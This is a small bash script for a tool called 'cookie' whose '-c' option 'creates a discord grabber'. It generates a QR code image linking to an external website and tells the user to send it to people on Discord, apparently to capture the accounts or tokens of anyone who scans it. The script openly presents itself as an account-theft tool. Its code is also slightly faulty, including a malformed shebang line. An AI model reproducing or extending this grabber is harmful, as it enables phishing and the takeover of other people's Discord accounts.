#/bin/bash

if ! command -v qrencode &> /dev/null; then
    echo "ERROR: dependencies not installed, would you like to install them?"
    read
    brew install qrencode
fi

function print_help() {
    cat ascii.txt
    echo ""
    echo "Usage: cookie [options]"
    echo "Options:"
    echo "-c            create a discord grabber"
    echo "-h            show this help screen"
}

function create_grabber() {
    qrencode -o image.jpg https://ikickmyfriends.vercel.app
    echo "Now you can send this grabber on discord"
    exit 1
}
if [ -z "$1" ]; then
    print_help
    exit 1
fi

while [[ $# -gt 0 ]]; do
    case "$1" in
        -h)
         print_help
         exit 0
        ;;
        -c)
         create_grabber
         exit 0
        ;;
        *)
        echo "Invalid argument"
        ;;
    esac
  shift
done
